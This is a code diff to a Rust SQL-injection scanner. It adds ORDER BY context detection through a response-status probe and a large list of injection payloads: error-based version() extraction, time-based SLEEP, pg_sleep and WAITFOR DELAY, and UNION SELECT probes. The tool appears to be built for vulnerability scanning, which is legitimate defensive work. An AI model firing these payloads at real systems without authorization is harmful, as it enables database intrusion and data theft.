@@ -381,7 +381,7 @@ impl EnhancedSqliScanner {
         &self,
         url: &str,
         param: &str,
-        _baseline: &HttpResponse,
+        baseline: &HttpResponse,
     ) -> InjectionContext {
         // Check if parameter name suggests context
         let param_lower = param.to_lowercase();
@@ -397,6 +397,7 @@ impl EnhancedSqliScanner {
         if param_lower.contains("sort")
             || param_lower.contains("order")
             || param_lower.contains("orderby")
+            || param_lower.contains("dir")
         {
             return InjectionContext::OrderBy;
         }
@@ -406,6 +407,18 @@ impl EnhancedSqliScanner {
             || param_lower.contains("top")
         {
             return InjectionContext::Limit;
+        }
+
+        // Category/filter parameters often use ORDER BY internally
+        if param_lower.contains("category")
+            || param_lower.contains("cat")
+            || param_lower.contains("filter")
+            || param_lower.contains("type")
+        {
+            // Test if it's ORDER BY injectable by response behavior
+            if let Some(ctx) = self.probe_order_by_context(url, param, baseline).await {
+                return ctx;
+            }
         }
 
         // Try to detect from URL structure
@@ -423,6 +436,61 @@ impl EnhancedSqliScanner {
 
         // Default to string context
         InjectionContext::String
+    }
+
+    /// Probe ORDER BY context by testing response behavior
+    /// Returns Some(OrderBy) if ORDER BY injection is detected via response differences
+    async fn probe_order_by_context(
+        &self,
+        url: &str,
+        param: &str,
+        baseline: &HttpResponse,
+    ) -> Option<InjectionContext> {
+        // Test ORDER BY injection by comparing responses
+        // Valid ORDER BY returns 200, invalid column number returns 500
+        let test_payloads = [
+            ("1--", true),      // Should succeed (column 1 usually exists)
+            ("9999--", false),  // Should fail (column 9999 unlikely to exist)
+            ("1'--", false),    // String injection attempt - different error
+        ];
+
+        let baseline_status = baseline.status;
+        let mut valid_count = 0;
+        let mut error_count = 0;
+
+        for (payload, expect_success) in test_payloads {
+            let test_url = if url.contains('?') {
+                format!("{}&{}={}", url, param, urlencoding::encode(payload))
+            } else {
+                format!("{}?{}={}", url, param, urlencoding::encode(payload))
+            };
+
+            if let Ok(response) = self.http_client.get(&test_url).await {
+                // Check for ORDER BY pattern: 200 OK for valid, 500 for invalid column
+                if expect_success {
+                    if response.status == 200 || response.status == baseline_status {
+                        valid_count += 1;
+                    }
+                } else {
+                    // Expect 500 Internal Server Error for invalid column
+                    if response.status == 500
+                        || response.status == 400
+                        || self.has_sql_error(&response)
+                    {
+                        error_count += 1;
+                    }
+                }
+            }
+        }
+
+        // If we get expected behavior (valid payload works, invalid fails)
+        // this indicates ORDER BY context
+        if valid_count >= 1 && error_count >= 1 {
+            info!("[SQLi] Detected ORDER BY context via response behavior analysis");
+            return Some(InjectionContext::OrderBy);
+        }
+
+        None
     }
 
     /// Get context-aware payloads based on detected database and injection context
@@ -451,12 +519,50 @@ impl EnhancedSqliScanner {
                 ]);
             }
             InjectionContext::OrderBy => {
-                // ORDER BY context
+                // ORDER BY context - comprehensive column enumeration
+                // Based on real-world exploitation (500 Internal Server Error vs 200 OK)
                 payloads.extend(vec![
-                    "1 ASC".to_string(),
-                    "1 DESC".to_string(),
-                    "1,2".to_string(),
+                    // Basic ORDER BY column enumeration
+                    "1--".to_string(),
+                    "1 ASC--".to_string(),
+                    "1 DESC--".to_string(),
+                    "2--".to_string(),
+                    "3--".to_string(),
+                    "4--".to_string(),
+                    "5--".to_string(),
+                    "8--".to_string(),
+                    "10--".to_string(),
+                    "15--".to_string(),
+                    "20--".to_string(),
+                    "50--".to_string(),
+                    "100--".to_string(),
+                    // Comment variations
+                    "1#".to_string(),
+                    "1/**/".to_string(),
+                    "1;--".to_string(),
+                    // Subquery in ORDER BY
                     "(SELECT 1)".to_string(),
+                    "(SELECT 1)--".to_string(),
+                    "(SELECT NULL)--".to_string(),
+                    // Case-based ORDER BY injection
+                    "(CASE WHEN 1=1 THEN 1 ELSE 2 END)--".to_string(),
+                    "(CASE WHEN 1=2 THEN 1 ELSE 2 END)--".to_string(),
+                    // IF-based ORDER BY (MySQL)
+                    "IF(1=1,1,2)--".to_string(),
+                    "IF(1=2,1,2)--".to_string(),
+                    // Error-based via ORDER BY
+                    "1,extractvalue(1,concat(0x7e,version()))--".to_string(),
+                    "1 AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--".to_string(),
+                    // Time-based ORDER BY
+                    "1,(SELECT SLEEP(2))--".to_string(),
+                    "1,IF(1=1,SLEEP(2),0)--".to_string(),
+                    // UNION in ORDER BY context
+                    "1 UNION SELECT NULL--".to_string(),
+                    "1 UNION SELECT NULL,NULL--".to_string(),
+                    // PostgreSQL specific
+                    "1,(SELECT pg_sleep(2))--".to_string(),
+                    // MSSQL specific
+                    "1;WAITFOR DELAY '0:0:2'--".to_string(),
                 ]);
             }
             _ => {
